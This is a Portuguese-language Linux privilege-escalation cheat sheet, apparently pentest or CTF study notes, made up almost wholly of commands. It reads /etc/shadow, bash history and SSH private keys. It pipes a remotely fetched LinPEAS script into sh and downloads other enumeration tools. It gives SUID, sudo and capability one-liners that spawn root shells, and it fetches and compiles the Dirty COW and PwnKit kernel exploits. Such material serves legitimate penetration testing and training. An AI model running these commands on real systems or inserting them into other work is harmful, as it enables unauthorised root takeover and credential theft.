# 🐧 Linux PrivEsc (Enumeração, SUID, Sudo, Capabilities, Kernel)

---

## 1. Enumeração Manual Essencial

```bash
# Informações de Kernel e SO
uname -a
cat /etc/*-release
cat /proc/version

# Usuário atual e lista de usuários com shell
id; whoami
cat /etc/passwd | grep "/bin/bash\|/bin/sh"
cat /etc/shadow 2>/dev/null

# Permissões de Sudo
sudo -l

# Arquivos com bit SUID ativado
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Diretórios e arquivos com permissão de escrita global
find / -writable -type d 2>/dev/null
find / -perm -777 -type f 2>/dev/null

# Crontabs e Processos em Execução
cat /etc/crontab; ls -la /etc/cron*
ps aux; ps -ef
ifconfig; route -n; netstat -nlptu

# Histórico e Chaves SSH
env; echo $PATH
cat ~/.bash_history
cat ~/.ssh/id_rsa
```

---

## 2. Ferramentas de Enumeração Automatizada

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh && ./les.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh
```

---

## 3. Principais Vetores de Escalação no Linux

### Bit SUID Ativado
```bash
# Se o binário bash tiver o bit SUID:
bash -p

# Se o find tiver o bit SUID:
find . -exec /bin/bash -p \; -quit

# Se o nmap antigo tiver o bit SUID:
nmap --interactive -> !sh
```

### Sudo Sem Senha (`sudo -l`)
```bash
sudo vim -c '!sh'
sudo less /etc/passwd        # Dentro do less digite: !/bin/sh
sudo su ; sudo -s ; sudo env /bin/bash
```

### Capabilities
```bash
# Listar capacidades especiais em arquivos:
getcap -r / 2>/dev/null

# cap_dac_read_search (permite ler qualquer arquivo como root)
tar -cvf /tmp/backup.tar /etc/shadow

# cap_setuid em executáveis Python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Exploits de Kernel Notáveis
```bash
# Dirty COW (CVE-2016-5195)
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt && ./dirty

# PwnKit (CVE-2021-4034 - Polkit)
wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o pwnkit && ./pwnkit
```